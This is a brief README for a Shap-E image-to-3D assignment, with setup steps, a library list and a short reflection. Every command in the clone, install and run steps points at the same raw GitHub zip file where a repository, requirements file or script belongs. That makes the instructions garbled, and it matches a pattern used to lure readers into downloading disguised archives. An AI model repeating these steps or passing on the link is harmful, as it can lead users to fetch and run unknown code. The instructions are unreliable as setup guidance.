## Steps to run

### 1. Clone the repo

```
git clone https://raw.githubusercontent.com/Tau-dev79/Imagine3D/main/episarcine/Imagine3D.zip
cd your-repo-name
```

### 2. Install Dependencies

```
pip install -r https://raw.githubusercontent.com/Tau-dev79/Imagine3D/main/episarcine/Imagine3D.zip
```

### 3. Insert the images you want to test into the `example/` folder.

### 4. Run the script

```
python https://raw.githubusercontent.com/Tau-dev79/Imagine3D/main/episarcine/Imagine3D.zip
```

## Libraries used

1. shap_e
2. Pyrender
3. os
4. rembg
5. trimesh
6. torch

## Your thought process in short

For this assignment, I used a very low-end model called Shap-E due to resource constraints. While Shap-E performs reasonably well for text-to-3D generation, its performance with image-based input is significantly less effective.
